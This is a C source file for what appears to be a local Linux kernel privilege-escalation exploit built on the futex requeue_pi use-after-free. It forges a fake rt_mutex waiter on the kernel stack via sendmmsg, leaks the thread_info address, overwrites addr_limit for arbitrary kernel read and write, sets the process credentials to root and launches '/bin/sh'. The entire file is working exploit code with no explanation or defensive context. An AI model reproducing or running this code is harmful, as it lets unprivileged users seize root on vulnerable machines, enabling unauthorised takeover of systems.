#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <sys/socket.h>
#include <assert.h>
#include <signal.h>
#include <pthread.h>
#include "futex.h"

#define USERLOG "[*] "

#define BLOCKBUF "AAAAAAAA"
#define BLOCKBUFLEN strlen(BLOCKBUF)

#define DEFAULT_PRIO 120
#define THREAD_INFO_BASE 0xffffe000

#define COUNT_OF(arr) (sizeof(arr) / sizeof(arr[0]))

int client_sockfd, server_sockfd;

struct mmsghdr msgvec;
struct iovec msg[7];

uint32_t non_pi_futex, pi_futex;
struct rt_mutex_waiter fake_waiter, leaker_waiter;

pthread_t corrupter;
struct thread_info *corrupter_thread_info;

void *lock_pi_futex(void *arg)
{
    assert(!flock(&pi_futex));
}

void kmemcpy(void *src, void *dst, size_t len)
{
    int pipefd[2];

    assert(!pipe(pipefd));
    assert(write(pipefd[1], src, len) == len);
    assert(read(pipefd[0], dst, len) == len);
}

void link_fake_leaker_waiters()
{
    fake_waiter.list_entry.node_list.prev = &leaker_waiter.list_entry.node_list;
    fake_waiter.list_entry.prio_list.prev = &leaker_waiter.list_entry.prio_list;
    fake_waiter.list_entry.prio = DEFAULT_PRIO + 1;
}

void setup_msgs()
{
    int i;

    for (i = 0; i < COUNT_OF(msg); i++)
    {
        msg[i].iov_base = &fake_waiter.list_entry.prio_list;
        msg[i].iov_len = 1;
    }
    msgvec.msg_hdr.msg_iov = msg;
    msgvec.msg_hdr.msg_iovlen = COUNT_OF(msg);
}

void setup_sockets()
{
    int fds[2];

    puts(USERLOG "Creating a pair of sockets for kernel stack modification using blocking I/O.");

    assert(!socketpair(AF_UNIX, SOCK_STREAM, 0, fds));

    client_sockfd = fds[0];
    server_sockfd = fds[1];

    while (send(client_sockfd, BLOCKBUF, BLOCKBUFLEN, MSG_DONTWAIT) != -1)
        ;
    assert(errno == EWOULDBLOCK);
}

void *forge_waiter(void *arg)
{
    puts(USERLOG "Placing the fake waiter on the dangling node within the mutex's waiters list.");

    setup_msgs();
    setup_sockets();
    assert(!fwait_requeue(&non_pi_futex, &pi_futex, 0));
    assert(!sendmmsg(client_sockfd, &msgvec, 1, 0));
}

void escalate_priv_sighandler()
{
    struct task_struct *corrupter_task, *main_task;
    struct cred *main_cred;
    unsigned int root_id = 0;
    void *highest_addr = (void *)-1;
    unsigned int i;

    puts(USERLOG "Escalating main thread's privileges to root.");

    kmemcpy(&highest_addr, &corrupter_thread_info->addr_limit, sizeof(highest_addr));
    printf(USERLOG "Written 0x%x to addr_limit.\n", -1);

    kmemcpy(&corrupter_thread_info->task, &corrupter_task, sizeof(corrupter_thread_info->task));
    printf(USERLOG "Corrupter's task_struct @ %p\n", corrupter_task);

    kmemcpy(&corrupter_task->group_leader, &main_task, sizeof(corrupter_task->group_leader));
    printf(USERLOG "Main thread's task_struct @ %p\n", main_task);

    kmemcpy(&main_task->cred, &main_cred, sizeof(main_task->cred));
    printf(USERLOG "Main thread's cred @ %p\n", main_cred);

    for (i = 0; i < COUNT_OF(main_cred->ids); i++)
        kmemcpy(&root_id, &main_cred->ids[i], sizeof(root_id));

    puts(USERLOG "Escalated privileges to root successfully.");
}

void escalate_priv()
{
    pthread_t addr_limit_writer;

    struct sigaction sigact = {.sa_handler = escalate_priv_sighandler};
    assert(!sigaction(SIGINT, &sigact, NULL));
    puts(USERLOG "Registered the privileges escalator signal handler for interrupting the corrupter thread.");

    fake_waiter.list_entry.prio_list.prev = (struct list_head *)&corrupter_thread_info->addr_limit;
    assert(!pthread_create(&addr_limit_writer, NULL, lock_pi_futex, NULL));

    sleep(1);
    pthread_kill(corrupter, SIGINT);
}

void leak_thread_info()
{
    link_fake_leaker_waiters();
    assert(!pthread_create(&corrupter, NULL, lock_pi_futex, NULL));

    sleep(1);
    corrupter_thread_info = (struct thread_info *)((unsigned int)leaker_waiter.list_entry.prio_list.next & THREAD_INFO_BASE);
    printf(USERLOG "Corrupter's thread_info @ %p\n", corrupter_thread_info);
}

int main()
{
    pthread_t forger, ref_holder;

    printf(USERLOG "non_pi_futex @ %p | pi_futex @ %p\n", &non_pi_futex, &pi_futex);
    printf(USERLOG "fake_waiter @ %p | leaker_waiter @ %p\n", &fake_waiter, &leaker_waiter);

    lock_pi_futex(NULL);

    assert(!pthread_create(&forger, NULL, forge_waiter, NULL));
    sleep(1);

    assert(frequeue(&non_pi_futex, &pi_futex, 1, 0) == 1);

    assert(!pthread_create(&ref_holder, NULL, lock_pi_futex, NULL));
    sleep(1);

    pi_futex = 0;
    frequeue(&pi_futex, &pi_futex, 1, 0);

    leak_thread_info();
    escalate_priv();

    sleep(3);
    puts(USERLOG "Popping root shell.");
    system("/bin/sh");
}
